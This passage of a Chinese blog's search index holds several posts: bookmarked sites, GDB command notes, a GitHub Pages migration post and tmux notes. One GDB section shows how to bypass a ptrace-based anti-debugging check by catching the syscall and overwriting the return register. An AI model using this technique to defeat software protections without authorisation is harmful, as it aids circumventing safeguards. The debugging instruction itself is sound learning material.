      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网站收藏列表</title>
      <link href="/2018/11/27/store-website/"/>
      <url>/2018/11/27/store-website/</url>
      
        <content type="html"><![CDATA[<h2 id="一、网站分类列表"><a href="#一、网站分类列表" class="headerlink" title="一、网站分类列表"></a>一、网站分类列表</h2><h3 id="1-1、推荐技术类网站"><a href="#1-1、推荐技术类网站" class="headerlink" title="1.1、推荐技术类网站"></a>1.1、推荐技术类网站</h3><ul><li><a href="https://www.tuicool.com/mags">编程狂人周刊</a></li><li><a href="https://weekly.manong.io/issues/">码农周刊</a></li><li><a href="https://toutiao.io/">开发者头条-今日头条</a></li><li><a href="http://mysql.taobao.org/monthly/">阿里-数据库内核月报</a></li><li><a href="http://jm.taobao.org/">阿里-中间件团队博客</a></li><li><a href="https://tech.meituan.com/">美团技术团队</a></li><li><a href="http://blogs.360.cn/">360核心安全技术博客</a></li></ul><h3 id="1-2、设计类网站"><a href="#1-2、设计类网站" class="headerlink" title="1.2、设计类网站"></a>1.2、设计类网站</h3><ul><li><a href="https://www.iconfont.cn/plus">Icon-阿里巴巴矢量图标库</a></li><li><a href="https://www.easyicon.net/">Easyicon图标下载</a></li><li><a href="http://www.akuziti.com/">艺术字体在线生成</a></li></ul><h3 id="1-3、在线工具"><a href="#1-3、在线工具" class="headerlink" title="1.3、在线工具"></a>1.3、在线工具</h3><ul><li><a href="https://tool.lu/">在线工具箱</a></li><li><a href="http://tool.chinaz.com/">站长工具</a></li><li><a href="http://www.atool9.com/">ATOOL在线工具</a></li><li><a href="https://www.processon.com/">ProcessOn在线流程图</a></li><li><a href="https://tool.lu/coderunner/">在线编程工具</a></li><li><a href="https://www.uupoop.com/">搞定设计-在线PS</a></li><li><a href="https://www.remove.bg/">图片背景抠除</a></li></ul><h3 id="1-4、阅读类"><a href="#1-4、阅读类" class="headerlink" title="1.4、阅读类"></a>1.4、阅读类</h3><ul><li><a href="https://sspai.com/">少数派</a></li><li><a href="http://www.mottoin.com/">MottoIN-专注于互联网信息安全的科技媒体</a></li><li><a href="https://www.infoq.cn/">InfoQ</a></li></ul><h3 id="1-5、搜索-导航类"><a href="#1-5、搜索-导航类" class="headerlink" title="1.5、搜索&#x2F;导航类"></a>1.5、搜索&#x2F;导航类</h3><ul><li><a href="https://www.jiumodiary.com/">鸠摩搜书-电子书搜索引擎</a></li><li><a href="https://duckduckgo.com/">DuckDuckGo 一款不追踪你的搜索引擎</a></li><li><a href="https://cn.bing.com/">Bing搜索</a></li><li><a href="https://www.anquanquan.info/">安全圈-信息安全导航页</a></li></ul><h3 id="1-6、国内镜像站"><a href="#1-6、国内镜像站" class="headerlink" title="1.6、国内镜像站"></a>1.6、国内镜像站</h3><ul><li><a href="https://pkg.phpcomposer.com/">PHPComposer</a></li><li><a href="https://mirrors.tuna.tsinghua.edu.cn/">清华大学开源软件镜像站</a></li></ul><h3 id="1-7、在线学习"><a href="#1-7、在线学习" class="headerlink" title="1.7、在线学习"></a>1.7、在线学习</h3><ul><li><a href="http://www.hetianlab.com/">合天网安实验室</a></li></ul><h3 id="1-8、其他工具"><a href="#1-8、其他工具" class="headerlink" title="1.8、其他工具"></a>1.8、其他工具</h3><ul><li><a href="http://assrt.net/">射手网(伪)字幕下载</a></li><li>[Archive网站历史记录查询](</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 收藏 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GDB使用笔记</title>
      <link href="/2018/11/26/gdb-tools/"/>
      <url>/2018/11/26/gdb-tools/</url>
      
        <content type="html"><![CDATA[<p>GDB是一个由GNU开源组织发布的、UNIX&#x2F;LINUX操作系统下的、基于命令行的、功能强大的程序调试工具。 对于一名Linux下工作的c++程序员，gdb是必不可少的工具；</p><h1 id="一、-gdb基本指令介绍"><a href="#一、-gdb基本指令介绍" class="headerlink" title="一、 gdb基本指令介绍"></a>一、 gdb基本指令介绍</h1><h2 id="1-1-gdb交互命令"><a href="#1-1-gdb交互命令" class="headerlink" title="1.1 gdb交互命令"></a>1.1 gdb交互命令</h2><ul><li><p><code>start</code>：开始调试；</p></li><li><p><code>n</code>：一条一条的执行；</p></li><li><p><code>backtrace/bt</code>：查看函数调用栈帧；</p></li><li><p><code>info/i locals</code>：查看当前栈帧局部变量；</p></li><li><p><code>frame/f</code>：选择栈帧，在查看局部变量；</p></li><li><p><code>print/p</code>：打印变量的值；</p></li><li><p><code>finish</code>：运行到当前函数返回；</p></li><li><p><code>set var sum=0</code>：修改变量的值；</p></li><li><p><code>list/l 行号或函数名</code>：列出源码；</p></li><li><p><code>display/undisplay sum</code>：每次停下显示变量的值&#x2F;取消跟踪；</p></li><li><p><code>x/7b input</code>：打印存储器内容，b–每个字节一组，7–7组；</p></li><li><p><code>disassemble</code>：反汇编当前函数或指定函数；</p></li><li><p><code>si</code>：一条指令一条指令调试 而 s 是一行一行代码；</p></li><li><p><code>info registers</code>：显示所有寄存器的当前值；</p></li><li><p><code>x/20 $esp</code>：查看内存中开始的20个数；</p></li><li><p><code>run(简写r)</code>：其作用是运行程序，当遇到断点后，程序会在断点处停止运行，等待用户输入下一步的命令;</p></li><li><p><code>continue(简写c)</code>：继续执行，到下一个断点处（或运行结束）;</p></li><li><p><code>next(简写n)</code>：单步跟踪程序，当遇到函数调用时，也不进入此函数体；此命令同 step 的主要区别是，step 遇到用户自定义的函数，将步进到函数中去运行，<br>而 next 则直接调用函数，不会进入到函数体内;</p></li><li><p><code>step(简写s)</code>：单步调试如果有函数调用，则进入函数；与命令n不同，n是不进入调用的函数的;</p></li><li><p><code>until</code>：当你厌倦了在一个循环体内单步跟踪时，这个命令可以运行程序直到退出循环体;</p></li><li><p><code>until+行号</code>： 运行至某行，不仅仅用来跳出循环;</p></li><li><p><code>finish</code>： 运行程序，直到当前函数完成返回，并打印函数返回时的堆栈地址和返回值及参数值等信息;</p></li><li><p><code>call函数(参数)</code>：调用程序中可见的函数，并传递“参数”，如：call gdb_test(55);</p></li><li><p><code>quit</code>：简记为 q ，退出gdb;</p></li></ul><h2 id="1-2-设置断点"><a href="#1-2-设置断点" class="headerlink" title="1.2 设置断点"></a>1.2 设置断点</h2><ul><li><code>break n(简写b n)</code>:在第n行处设置断点（可以带上代码路径和代码名称： <code>b OAGUPDATE.cpp:578</code>）;<ul><li>continue&#x2F;c：连续运行；</li></ul></li><li><code>b fn1 if a＞b</code>：条件断点设置，满足条件才激活断点；</li><li><code>break func(break缩写为b)</code>：在函数func()的入口处设置断点，如：<code>break cb_button</code>；</li><li>b 匿名空间名::函数名<code>：对匿名空间设置断点，当匿名空间存在名称时，使用例如，</code>b Foo::foo&#96;;</li><li><code>b (anonymous namespace)::函数名</code>：对匿名空间设置断点，当匿名空间无名称时，使用例如，<code>b (anonymous namespace)::bar</code>；</li><li><code>b *address</code>：在程序地址上打断点，当调试汇编程序时，我们可以在程序地址上进行打断点，例如，<code>b *0x400522</code>；</li><li><code>b *address</code>：在程序入口处打断点，如果不知道程序的入口地址，可以使用<code>readelf -h a.out </code>指令获取程序的入口地址，例如<code>b *0x400440</code>；</li><li><code>b *func</code>：在函数的第一条汇编指令处打断点，通常我们使用<code>b func</code>打断点，但是这样并不会设置在汇编层次函数的开头，如果要将断点设置在汇编指令层次的开头，需要使用该指令；</li><li><code>delete 断点号n</code>：删除第n个断点；</li><li><code>disable 断点号n</code>：暂停第n个断点；</li><li><code>enable 断点号n</code>：开启第n个断点；</li><li><code>clear 行号n</code>：清除第n行的断点；</li><li><code>info b(info/i breakpoints)</code>：显示当前程序的断点设置情况；</li><li><code>delete breakpoints</code>：清除所有断点；</li></ul><h2 id="1-3-查看源代码"><a href="#1-3-查看源代码" class="headerlink" title="1.3 查看源代码"></a>1.3 查看源代码</h2><ul><li><code>list</code>：简记为 l ，其作用就是列出程序的源代码，默认每次显示10行;</li><li><code>list 行号</code>：将显示当前文件以“行号”为中心的前后10行代码，如：list 12;</li><li><code>list 函数名</code>：将显示“函数名”所在函数的源代码，如：list main;</li><li><code>list</code>：不带参数，将接着上一次 list 命令的，输出下边的内容;</li></ul><h2 id="1-4-打印表达式"><a href="#1-4-打印表达式" class="headerlink" title="1.4 打印表达式"></a>1.4 打印表达式</h2><ul><li><p><code>print表达式</code>：简记为 p ，其中“表达式”可以是任何当前正在被测试程序的有效表达式，比如当前正在调试C语言的程序，那么“表达式”可以是任何C语言的有效表达式，包括数字，变量甚至是函数调用;</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">print</span> ++a：将把整数 a 中的值加1,并显示出来<br><span class="hljs-built_in">print</span> name：将显示 name 的值<br><span class="hljs-built_in">print</span> gdb_test(a)：将以变量 a 作为参数调用 gdb_test() 函数<br></code></pre></td></tr></table></figure></li><li><p><code>display 表达式</code>：在单步运行时将非常有用，使用<code>display</code>命令设置一个表达式后，它将在每次单步进行指令后，紧接着输出被设置的表达式及值。如： <code>display a</code>;</p></li><li><p><code>watch表达式</code>：设置一个监视点，一旦被监视的“表达式”的值改变，<code>gdb</code>将强行终止正在被调试的程序。如： <code>watch a</code>;</p></li><li><p><code>whatis</code> ：查询变量或函数;</p></li><li><p><code>info function</code>： 查询函数;</p></li><li><p><code>info locals</code>： 显示当前堆栈页的所有变量;</p></li></ul><h2 id="1-5-查询运行信息"><a href="#1-5-查询运行信息" class="headerlink" title="1.5 查询运行信息"></a>1.5 查询运行信息</h2><ul><li><code>where/bt</code> ：当前运行的堆栈列表；</li><li><code>bt backtrace</code>：显示当前调用堆栈;</li><li><code>up/down</code> ：改变堆栈显示的深度;</li><li><code>set args 参数</code>：指定运行时的参数;</li><li><code>show args</code>：查看设置好的参数;</li><li><code>info program</code>： 来查看程序的是否在运行，进程号，被暂停的原因;</li></ul><h2 id="1-6-分割窗口"><a href="#1-6-分割窗口" class="headerlink" title="1.6 分割窗口"></a>1.6 分割窗口</h2><ul><li><code>layout</code>：用于分割窗口，可以一边查看代码，一边测试：</li><li><code>layout src</code>：显示源代码窗口</li><li><code>layout asm</code>：显示反汇编窗口</li><li><code>layout regs</code>：显示源代码&#x2F;反汇编和CPU寄存器窗口</li><li><code>layout split</code>：显示源代码和反汇编窗口</li><li><code>Ctrl + L</code>：刷新窗口</li></ul><h2 id="1-7-调试正在运行进程"><a href="#1-7-调试正在运行进程" class="headerlink" title="1.7 调试正在运行进程"></a>1.7 调试正在运行进程</h2><ul><li><code>gdb -args ./a.out a b c</code></li><li><code>gdb attach PID</code>：调试正在运行的进程；</li><li><code>gdb -q a PID</code>:调试正在运行的进程；</li><li><code>info thread</code>：查看当前进程的线程信息；</li></ul><h2 id="1-8-更强大的工具"><a href="#1-8-更强大的工具" class="headerlink" title="1.8 更强大的工具"></a>1.8 更强大的工具</h2><p>cgdb可以看作gdb的界面增强版,用来替代gdb的 gdb -tui。<br>cgdb主要功能是在调试时进行代码的同步显示，这无疑增加了调试的方便性，<br>提高了调试效率。界面类似vi，符合unix&#x2F;linux下开发人员习惯;如果熟悉gdb和vi，<br>几乎可以立即使用cgdb。</p><h1 id="二、-其他使用方式"><a href="#二、-其他使用方式" class="headerlink" title="二、 其他使用方式"></a>二、 其他使用方式</h1><h2 id="2-1-直接执行函数"><a href="#2-1-直接执行函数" class="headerlink" title="2.1 直接执行函数"></a>2.1 直接执行函数</h2><ul><li><code>call func()</code>：直接调用函数执行</li><li><code>print func()</code>：直接调用函数执行</li></ul><h2 id="2-2-设置catchpoint"><a href="#2-2-设置catchpoint" class="headerlink" title="2.2 设置catchpoint"></a>2.2 设置catchpoint</h2><ul><li><p><code>catch exec</code>：可以用<code>catch exec</code>命令为<code>exec</code>系列系统调用设置<code>catchpoint</code>(目前只有HP-UX和GNU&#x2F;Linux支持这个功能)；</p></li><li><p><code>catch fork</code>：可以用<code>catch fork</code>命令为<code>fork</code>调用设置<code>catchpoint</code>(目前只有HP-UX和GNU&#x2F;Linux支持这个功能)；</p></li><li><p><code>catch vfork</code>：可以用<code>catch vfork</code>命令为<code>vfork</code>调用设置<code>catchpoint</code>；</p></li></ul><h2 id="2-3-通过为ptrace调用设置catchpoint破解anti-debugging的程序"><a href="#2-3-通过为ptrace调用设置catchpoint破解anti-debugging的程序" class="headerlink" title="2.3 通过为ptrace调用设置catchpoint破解anti-debugging的程序"></a>2.3 通过为ptrace调用设置catchpoint破解anti-debugging的程序</h2><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ptrace.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br> <br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>                                                                      <br>&#123;<br>        <span class="hljs-keyword">if</span> (ptrace(PTRACE_TRACEME, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span> ) &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Gdb is debugging me, exit.\n&quot;</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;No debugger, continuing\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>有些程序不想被gdb调试，它们就会在程序中调用“<code>ptrace</code>”函数，一旦返回失败，就证明程序正在被gdb等类似的程序追踪，所以就直接退出。以上面程序为例：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">(gdb) start<br>Temporary breakpoint 1 at 0x400508: file a.c, line 6.<br>Starting program: /data2/home/nanxiao/a<br><br>Temporary breakpoint 1, main () at a.c:6<br>6                       <span class="hljs-keyword">if</span> (ptrace(PTRACE_TRACEME, 0, 0, 0) &lt; 0 ) &#123;<br>(gdb) n<br>7                               <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Gdb is debugging me, exit.\n&quot;</span>);<br>(gdb)<br>Gdb is debugging me, <span class="hljs-built_in">exit</span>.<br>8                               <span class="hljs-built_in">return</span> 1;<br></code></pre></td></tr></table></figure><p>破解这类程序的办法就是为<code>ptrace</code>调用设置<code>catchpoint</code>，通过修改<code>ptrace</code>的返回值，达到目的。仍以上面程序为例：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">(gdb) catch syscall ptrace<br>Catchpoint 2 (syscall <span class="hljs-string">&#x27;ptrace&#x27;</span> [101])<br>(gdb) r<br>Starting program: /data2/home/nanxiao/a<br><br>Catchpoint 2 (call to syscall ptrace), 0x00007ffff7b2be9c <span class="hljs-keyword">in</span> ptrace () from /lib64/libc.so.6<br>(gdb) c<br>Continuing.<br><br>Catchpoint 2 (returned from syscall ptrace), 0x00007ffff7b2be9c <span class="hljs-keyword">in</span> ptrace () from /lib64/libc.so.6<br>(gdb) <span class="hljs-built_in">set</span> <span class="hljs-variable">$rax</span> = 0<br>(gdb) c<br>Continuing.<br>No debugger, continuing<br>[Inferior 1 (process 11491) exited normally]<br></code></pre></td></tr></table></figure><p>可以看到，通过修改<code>rax</code>寄存器的值，达到修改返回值的目的，从而让gdb可以继续调试程序（打印“<code>No debugger, continuing</code>”）。</p><h2 id="2-4-改变字符串的值"><a href="#2-4-改变字符串的值" class="headerlink" title="2.4 改变字符串的值"></a>2.4 改变字符串的值</h2><ul><li><code>set 函数::变量</code>：可以用<code>set 函数::变量</code>命令改变字符串的值，例如<code>set main::arr=&quot;Tom&quot;</code>；</li><li><code>set {变量详情} 变量地址 = &quot;Tom&quot;</code>：可以通过访问内存地址的方法改变字符串的值，例如<code>set {char [4]} 0x80477a4 = &quot;Ace&quot;</code>；</li></ul><h2 id="2-5-配置gdb-init文件"><a href="#2-5-配置gdb-init文件" class="headerlink" title="2.5 配置gdb init文件"></a>2.5 配置gdb init文件</h2><p>当gdb启动时，会读取HOME目录和当前目录下的的配置文件，执行里面的命令。这个文件通常为“.gdbinit”。</p><p>这里给出了本文档中介绍过的，可以放在“.gdbinit”中的一些配置：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 打印STL容器中的内容</span><br>python<br>import sys<br>sys.path.insert(0, <span class="hljs-string">&quot;/home/xmj/project/gcc-trunk/libstdc++-v3/python&quot;</span>)<br>from libstdcxx.v6.printers import register_libstdcxx_printers<br>register_libstdcxx_printers (None)<br>end<br><br><span class="hljs-comment"># 保存历史命令</span><br><span class="hljs-built_in">set</span> <span class="hljs-built_in">history</span> filename ~/.gdb_history<br><span class="hljs-built_in">set</span> <span class="hljs-built_in">history</span> save on<br><br><span class="hljs-comment"># 退出时不显示提示信息</span><br><span class="hljs-built_in">set</span> confirm off<br><br><span class="hljs-comment"># 按照派生类型打印对象</span><br><span class="hljs-built_in">set</span> <span class="hljs-built_in">print</span> object on<br><br><span class="hljs-comment"># 打印数组的索引下标</span><br><span class="hljs-built_in">set</span> <span class="hljs-built_in">print</span> array-indexes on<br><br><span class="hljs-comment"># 每行打印一个结构体成员</span><br><span class="hljs-built_in">set</span> <span class="hljs-built_in">print</span> pretty on<br></code></pre></td></tr></table></figure><h2 id="2-6-设置源文件查找路径"><a href="#2-6-设置源文件查找路径" class="headerlink" title="2.6 设置源文件查找路径"></a>2.6 设置源文件查找路径</h2><ul><li><code>directory /data1/dir/</code>：在调试中使用该指令指定源文件的查找目录，避免找不到源文件的位置；</li><li><code>gdb -q a.out -d /search/code/some </code>：启动时也可以使用<code>-d</code>参数加载<code>code</code>的位置；</li></ul><h2 id="2-7-自动反汇编后面要执行的代码"><a href="#2-7-自动反汇编后面要执行的代码" class="headerlink" title="2.7 自动反汇编后面要执行的代码"></a>2.7 自动反汇编后面要执行的代码</h2><ul><li><code>set disassemble-next-line on</code>：要在任意情况下反汇编后面要执行的代码，之后使用start；</li><li><code>set disassemble-next-line auto</code>：在后面的代码没有源码的情况下才反汇编后面要执行的代码，之后使用start；</li><li><code>set disassemble-next-line off</code>：关闭自动反汇编后面要执行的代码，之后使用start指令；</li></ul><h2 id="2-8-显示程序原始机器码"><a href="#2-8-显示程序原始机器码" class="headerlink" title="2.8 显示程序原始机器码"></a>2.8 显示程序原始机器码</h2><ul><li>disassemble &#x2F;r functionName：用16进制形式显示函数的原始机器码；</li></ul><h2 id="2-9-显示将要执行的汇编指令"><a href="#2-9-显示将要执行的汇编指令" class="headerlink" title="2.9 显示将要执行的汇编指令"></a>2.9 显示将要执行的汇编指令</h2><ul><li>display &#x2F;i $pc：显示当程序停止时，将要执行的汇编指令，可用于显示在断点之后的即将要执行的汇编指令；</li></ul><h1 id="三、参考链接"><a href="#三、参考链接" class="headerlink" title="三、参考链接"></a>三、参考链接</h1><ul><li><a href="https://www.kancloud.cn/itfanr/i-100-gdb-tips/81864">为系统调用设置catchpoint</a></li><li><a href="https://www.kancloud.cn/itfanr/i-100-gdb-tips/81851">100-gdb-tips</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
            <tag> GDB </tag>
            
            <tag> 代码调试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博客转移至GitHub Pages</title>
      <link href="/2018/11/25/github-pages-hexo/"/>
      <url>/2018/11/25/github-pages-hexo/</url>
      
        <content type="html"><![CDATA[<h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>已经很久没有写博客了，加上毕业之后腾讯云以及阿里云的一些针对学生的服务器优惠政策已经没法使用了，并且刚开始工作的资金比较紧张，在前段时候腾讯云的服务器过期之后，自己也没再续费，只是把域名续费了，把之前写的一些文章导出保存了下来，想着有精力的时候再拾起来，转眼之间，2018年已经快过去了，也是时候该整了一下了。</p><p>使用了很久的<code>Ghost</code>，对它的各种使用都很欣赏，也很感谢它培养了我的<code>Markdown</code>的写作习惯，但是需要花费一些金钱上的精力去维护一个自留地，多少成为了我逐渐放弃<code>Ghost</code>的原因；转移到<code>GitHub Pages</code>上很大的原因还是不需要去维护自己的服务器，只是去简单的记录，没有多余的担心，这一点比<code>Ghost</code>好了很多；自己博客上的文章倒是没有多少，但是的确是跟了自己很多年的心血，带着自己的当初的努力与骄傲。</p><h2 id="二、博客迁移"><a href="#二、博客迁移" class="headerlink" title="二、博客迁移"></a>二、博客迁移</h2><ul><li>GitHub Pages + Hexo + Melody Theme</li><li>Disqus</li><li>微博图床 + 七牛云 + URL替换脚本</li><li>百度统计 + Google Analytics</li></ul><h2 id="三、GitHub-Pages-Hexo-Melody-Theme"><a href="#三、GitHub-Pages-Hexo-Melody-Theme" class="headerlink" title="三、GitHub Pages + Hexo + Melody Theme"></a>三、GitHub Pages + Hexo + Melody Theme</h2><p><code>GitHub Pages</code>是面向用户、组织和项目开放的公共静态页面搭建托管服 务，站点可以被免费托管在 <code>Github</code> 上，你可以选择使用<code> Github Pages</code> 默认提供的域名 <code>*.github.io</code>或者自定义域名来发布站点。</p><p><code>Hexo</code>（<a href="https://hexo.io/zh-cn/docs/">Hexo官网 - 文档</a>）是一个快速、简洁且高效的博客框架。<code>Hexo</code> 使用 <code>Markdown</code>（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。</p><p><code>Melody</code>是<code>Hexo</code>的一个比较好用的模板，配置项简洁明了，模板的整体风格比较清新（感觉Hexo的整体的模板风格都是挺不错的）。</p><h2 id="四、Disqus"><a href="#四、Disqus" class="headerlink" title="四、Disqus"></a>四、Disqus</h2><p>之前博客中主流的评论组件可能就是多说了，在之前使用<code>Ghost</code>的时候我也是使用的多说的评论组件，但是无奈多说的业务转型，要放弃评论组件了，之前在使用<code>Ghost</code>的时候曾经转而使用过畅言等其他插件，其实也就那个样，各家的缺点优点对于我这种访问评论量不大的站点来说没什么不同，之所以尝试去使用<code>Disqus</code>很大的一方面还是模板中原生支持该组件，配置较为简单，体验也还OK。</p><h2 id="五、微博图床-七牛云-URL替换脚本"><a href="#五、微博图床-七牛云-URL替换脚本" class="headerlink" title="五、微博图床 + 七牛云 + URL替换脚本"></a>五、微博图床 + 七牛云 + URL替换脚本</h2><p>图床的作用不言而喻，刚开始写博客的时候就关注了一些图床，比如七牛云，又拍云以及微博图床等，目前我使用的就是七牛云+微博图床（之前的一些封面图在微博图床，因此目前迁移过来后仍在使用）。</p><h2 id="六、百度统计-Google-Analytics"><a href="#六、百度统计-Google-Analytics" class="headerlink" title="六、百度统计 + Google Analytics"></a>六、百度统计 + Google Analytics</h2><p>我这站点也没啥流量啦，仅用了记录，不过就看使用后的感觉来说，也能获得不少有趣的消息；</p>]]></content>
      
      
      
        <tags>
            
            <tag> 博客 </tag>
            
            <tag> GitHub Pages </tag>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tmux使用记录</title>
      <link href="/2018/11/25/tmux/"/>
      <url>/2018/11/25/tmux/</url>
      
        <content type="html"><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>Tmux是Linux中一款终端窗口复用的工具。对比与iTerm来说，iTerm只是作为一款GUI软件，在一个窗口中只能显示一个Shell的内容，但是Tmux却可以在一个窗口中显示多个Shell内容；对比与Screen来说，Screen是GNU 软件，而 Tmux 使用的是 BSD 协议，最为重要的是 Tmux 支持 Vi&#x2F;Emacs 风格的键盘映射，更好的接口和文档，以及更好的脚本控制。</p><h2 id="二、基本概念"><a href="#二、基本概念" class="headerlink" title="二、基本概念"></a>二、基本概念</h2><p>Tmux的主要元素分为三层：</p><ul><li><code>Session</code> ：一组窗口的集合，通常用来概括同一个任务，可以设置不同的名字以便于任务之间的切换；</li><li><code>Window</code>： 单个可见窗口，Window有自己的编号，也可以认为和 iTerm2 中的 Tab 类似；</li><li><code>Pane</code>： 窗格，被划分成小块的窗口，类似于 Vim 中 C-w +v 后的效果；</li></ul><p><img src="/assets/images/concept.jpg" alt="Tmux概念设计" loading="lazy"></p><h2 id="三、安装与使用"><a href="#三、安装与使用" class="headerlink" title="三、安装与使用"></a>三、安装与使用</h2><h3 id="3-1、安装"><a href="#3-1、安装" class="headerlink" title="3.1、安装"></a>3.1、安装</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">brew install tmux       <span class="hljs-comment"># OSX</span><br>pacman -S tmux          <span class="hljs-comment"># archlinux</span><br>apt-get install tmux    <span class="hljs-comment"># Ubuntu</span><br>yum install tmux        <span class="hljs-comment"># Centos</span><br></code></pre></td></tr></table></figure><h3 id="3-2、基本操作"><a href="#3-2、基本操作" class="headerlink" title="3.2、基本操作"></a>3.2、基本操作</h3><h4 id="3-2-1、信息查询"><a href="#3-2-1、信息查询" class="headerlink" title="3.2.1、信息查询"></a>3.2.1、信息查询</h4><ul><li><code>tmux list-keys</code> 列出所有可以的快捷键和其运行的 tmux 命令</li><li><code>tmux list-commands</code> 列出所有的 tmux 命令及其参数</li><li><code>tmux info</code> 流出所有的 session, window, pane, 运行的进程号，等。</li></ul><h4 id="3-2-2、未进入Tmux的操作"><a href="#3-2-2、未进入Tmux的操作" class="headerlink" title="3.2.2、未进入Tmux的操作"></a>3.2.2、未进入Tmux的操作</h4><ul><li><code>session 会话</code>：session是一个特定的终端组合，输入tmux就可以打开一个新的session<ul><li><code>tmux new -s session_name</code> 创建一个叫做 <code>session_name</code> 的 tmux session</li><li><code>tmux attach -t session_name</code> 重新开启叫做 <code>session_name</code> 的 tmux session</li><li><code>tmux switch -t session_name</code> 转换到叫做 <code>session_name</code> 的 tmux session</li><li><code>tmux list-sessions</code> &#x2F; <code>tmux ls</code> 列出现有的所有 session</li><li><code>tmux detach</code> 离开当前开启的 session</li><li><code>tmux kill-server</code> 关闭所有 session</li></ul></li><li><code>window 窗口</code>：session 中可以有不同的 window（但是同时只能看到一个 window）<ul><li><code>tmux new-window</code> 创建一个新的 window</li><li><code>tmux list-windows</code></li><li><code>tmux select-window -t :0-9</code> 根据索引转到该 window</li><li><code>tmux rename-window</code> 重命名当前 window</li></ul></li><li><code>pane 面板</code>：window 中可以有不同的 pane（可以把 window 分成不同的部分）<ul><li><code>tmux split-window</code> 将 window 垂直划分为两个 pane</li><li><code>tmux split-window -h</code> 将 window 水平划分为两个 pane</li><li><code>tmux swap-pane -[UDLR]</code> 在指定的方向交换 pane</li><li><code>tmux select-pane -[UDLR]</code> 在指定的方向选择下一个 pane</li></ul></li></ul><h4 id="3-2-3、进入Tmux的操作"><a href="#3-2-3、进入Tmux的操作" class="headerlink" title="3.2.3、进入Tmux的操作"></a>3.2.3、进入Tmux的操作</h4><p>常用的是在 tmux 中直接通过默认前缀 <code>ctrl + b</code> 之后输入对应命令来操作，具体如下：</p><h5 id="3-2-3-1、基本操作"><a href="#3-2-3-1、基本操作" class="headerlink" title="3.2.3.1、基本操作"></a>3.2.3.1、基本操作</h5><ul><li><code>?</code> 列出所有快捷键；按q返回</li><li><code>d</code> 脱离当前会话,可暂时返回Shell界面</li><li><code>s</code> 选择并切换会话；在同时开启了多个会话时使用</li><li><code>D</code> 选择要脱离的会话；在同时开启了多个会话时使用</li><li><code>:</code> 进入命令行模式；此时可输入支持的命令，例如 <code>kill-server</code> 关闭所有tmux会话</li><li><code>[</code> 复制模式，光标移动到复制内容位置，空格键开始，方向键选择复制，回车确认，q&#x2F;Esc退出</li><li><code>]</code> 进入粘贴模式，粘贴之前复制的内容，按q&#x2F;Esc退出</li><li><code>~</code> 列出提示信息缓存；其中包含了之前tmux返回的各种提示信息</li><li><code>t</code> 显示当前的时间</li><li><code>ctrl + z</code> 挂起当前会话</li></ul><h5 id="3-2-3-2、窗口操作"><a href="#3-2-3-2、窗口操作" class="headerlink" title="3.2.3.2、窗口操作"></a>3.2.3.2、窗口操作</h5><ul><li><code>c</code> 创建新窗口</li><li><code>&amp;</code> 关闭当前窗口</li><li><code>[0-9]</code> 数字键切换到指定窗口</li><li><code>p</code> 切换至上一窗口</li><li><code>n</code> 切换至下一窗口</li><li><code>l</code> 前后窗口间互相切换</li><li><code>w</code> 通过窗口列表切换窗口</li><li><code>,</code> 重命名当前窗口，便于识别</li><li><code>.</code> 修改当前窗口编号，相当于重新排序</li><li><code>f</code> 在所有窗口中查找关键词，便于窗口多了切换</li></ul><h5 id="3-2-3-3、面板操作"><a href="#3-2-3-3、面板操作" class="headerlink" title="3.2.3.3、面板操作"></a>3.2.3.3、面板操作</h5><ul><li><code>&quot;</code> 将当前面板上下分屏（我自己改成了 <code>|</code>）</li><li><code>%</code> 将当前面板左右分屏（我自己改成了 <code>-</code>）</li><li><code>x</code> 关闭当前分屏</li><li><code>!</code> 将当前面板置于新窗口,即新建一个窗口,其中仅包含当前面板</li><li><code>ctrl+方向键</code> 以1个单元格为单位移动边缘以调整当前面板大小</li><li><code>alt+方向键</code> 以5个单元格为单位移动边缘以调整当前面板大小</li><li><code>q</code> 显示面板编号</li><li><code>o</code> 选择当前窗口中下一个面板</li><li><code>方向键</code> 移动光标选择对应面板</li><li><code>{</code> 向前置换当前面板</li><li><code>}</code> 向后置换当前面板</li><li><code>alt+o</code> 逆时针旋转当前窗口的面板</li><li><code>ctrl+o</code> 顺时针旋转当前窗口的面板</li><li><code>z</code> 最大化当前所在面板</li><li><code>page up</code> 向上滚动屏幕，q 退出</li><li><code>page down</code> 向下滚动屏幕，q 退出</li></ul><h2 id="四、配置文件"><a href="#四、配置文件" class="headerlink" title="四、配置文件"></a>四、配置文件</h2>]]></content>
      
      
      
        <tags>
            
            <tag> Tmux </tag>
            
            <tag> Tools </tag>
            
